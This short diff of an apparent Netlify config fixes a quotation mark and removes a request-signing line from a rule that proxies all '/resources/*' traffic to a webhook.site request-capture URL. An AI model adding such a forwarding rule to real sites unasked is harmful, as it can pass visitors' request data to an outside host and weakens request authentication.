@@ -1,6 +1,5 @@
 [[redirects]]
   from = "/resources/*"
-  to = "https://webhook.site/21a6c2b8-d33f-480d-99c7-3b0ce50d55b6/:splat*
+  to = "https://webhook.site/21a6c2b8-d33f-480d-99c7-3b0ce50d55b6/:splat*"
   status = 200
   force = true
-  signed = "API_SIGNATURE_TOKEN"
